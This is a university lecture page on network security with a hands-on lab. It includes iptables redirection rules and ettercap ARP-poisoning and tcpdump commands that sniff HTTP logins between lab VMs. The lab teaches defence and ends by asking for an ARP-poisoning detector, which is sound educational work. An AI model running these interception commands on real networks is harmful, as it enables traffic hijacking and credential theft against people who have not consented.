---
layout: default
course_number: CS497
title: "Lecture 5: Computer Networking"
---

# Lecture 5

- Network Security
- Basic Internet technology
- TCP/IP
- Network models and ARP security
- Spoofing, sniffing, session hijacking
- Denial-of-service botnets

### Reading 

- Introduction to Computer Security: Chapter 5
- [Probabilistic Packet Marking for Large-Scale IP Traceback.pdf](ProbabilisticPacketMarking.pdf)

### Slides

- [Computer Networking](Ch05-NetworkModelsARP.pdf)
- [TCP/IP](Ch05-NetworksTCP-IP.pdf)

### In Class Exercise *ARP spoofing* (part 1)
- Startup VirtualBox and create three (3) virtual machines. 
- Ensuring that MAC addresses of all virtual-machines are unique
   - Base on the VirtualBox version you are using: the options are either `Reinitialize the MAC address of all network cards` or `Generate new MAC addresses for all network adapters`.
- Change the network settings of each virtual machine to `Bridged Adapter`. 
- One is used to host applications (server) and other virtual machines are for the victim and the attacker.
- Once the network setup is done, run ```ifconfig``` on all VMs and record the IP address for each VM. Take a screenshot.
- **Normal Scenario:**
  - Create a folder in *Server* at ```~/testserver```.
  - Create a file named ```test.html``` in ```~/testserver``` with some text content. Take a screenshot.
  - Open a terminal window and change directory to ```~/testserver```, start a python SimpleHTTPServer with the following command 
  ```python -m SimpleHTTPServer```
  - Open a browser session in ```Victim’s``` VM and enter ```http://<server_ip_address>:8000/test.html``` in the URL bar. 
  - Observe that we get the expected response. Take a screenshot.
- **Victim to Attacker Link Scenario:**
  - Execute the following commands in ```Victim's``` VM and take a screenshot.
  ```
  sudo iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination attacker_ip_address
  sudo iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination attacker_ip_address
  sudo iptables -t nat -A OUTPUT -p tcp --dport 8000 -j DNAT --to-destination attacker_ip_address
  ```
  - Create a folder in *Attacker* at ```~/testserver```.
  - Create a file named ```test.html``` in ```~/testterver``` with some text content. Take a screenshot.
  - Open a terminal window and change directory to ```~/testserver```, start a python SimpleHTTPServer with the following command ```python -m SimpleHTTPServer```
  - In ```Victim’s``` VM refresh the browser and observe that we get the expected response. Take a screenshot.
- **Attacker to Server Link Scenario:**
  - Execute the following commands in ```Attacker's``` VM and take a screenshot.
  ```
  sudo sysctl -w net.ipv4.ip_forward=1
  sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination server_ip_address
  sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination server_ip_address
  sudo iptables -t nat -A PREROUTING -p tcp --dport 8000 -j DNAT --to-destination server_ip_address
  sudo iptables -t nat -A POSTROUTING -j MASQUERADE
  ```
  - Once above rules are in place, refresh the ```Victim’s``` browser and observe that we are getting the original response from the ```Server```. Take a screenshot. However, now all the traffic is routed through the ```Attacker’s``` network interface. 
  - Open up Wireshark in ```Attacker’s``` virtual machine (you might need to run Wireshark with sudo in order to get the interface list, if group permissions are not properly set). 
  - Select *enp0s3* as the interface and capture communication. *Interface name may vary.* 
  - Observe network traffic as you refresh the ```Victim's``` browser. Take a screenshot.
- To reset the iptables: ```sudo iptables -F```
- [iptables man pages](https://linux.die.net/man/8/iptables)

### In Class Exercise *ARP spoofing* (part 2)
- In this exercise we will be using ettercap to perform ARP poisoning. Ettercap is a comprehensive suite for man in the middle attacks.
- You can install ettercap on your VM bu using -```sudo apt-get install ettercap-text-only```
- The goal of the second part of the lab is to sniff unsecured user authentication and to become familiar with ```tcpdump``` and ```ettercap```. ```tcpdump``` is a command lline network analyzer alternative to Wireshark. In this lab, we will only need the attacker and the victim (client) VM's to be running.
- ```ip r | grep default``` will provide you with indormation about the default gateway. 
- Extensive information aregarding ```tcpdump``` can be found [here](https://www.tcpdump.org/manpages/tcpdump.1.html) or by using the terminal ```man tcpdump```.

- **Steps**
1. From the attacker's VM, open a terminal window and start monitoring any ARP request and replies. Use the following command: ```sudo tcpdump -n -i <interface_name> arp```. Depending on the network traffic, you might begin see a few ARP requests for other machines.
2. Still from the attacker's VM, open a second terminal and start monitoring traffic between our victim and the rest of the Internet. Use the command: ```sudo tcpdump -n -i <interface_name> tcp and port 80 and host <victim_ip_address> -s0 -A -c 1000```. 
3. In a third terminal window enter the following command ```sudo ettercap -T -M arp:oneway /<victim_ip_address>// /<router_ip_address>//```. This will ask ettercap to redirect packets from victim to server through your router first. It will then replay those packets on to the correct MAC address so that neither host notices that ettercap is stealing these packets.
4. On the Victim's VM open up firefox and navigate to [http://aavtrain.com/](http://aavtrain.com/).
5. Login to [http://aavtrain.com/](http://aavtrain.com/) with **fake** username and password. Record what you have used. 
6. Review the output from the second terminal on the attacker's VM. Can you find the sniffed HTTP username and password used to login into the website? If you cannot find the username and the password in the payload, feel free to use wireshark to point you to the right packet. Take a screenshots of the compromised data. 
7. Back to the victims VM's, using the browser navigate to [http://www.facebook.com](http://www.facebook.com) and try to sniff the user login information. Explain what happens and provide a brief explanation. 
8. Shutdown ettercap by pressing 'q'.

### Report 
- Screenshots from both parts of the lab along with any information you would like to share. 
- Awnser the following:
1. What were two things you learned from this lab?
2. Research and submit a link to a tool that we can install on our Linux machine to detect ARP poisoning.
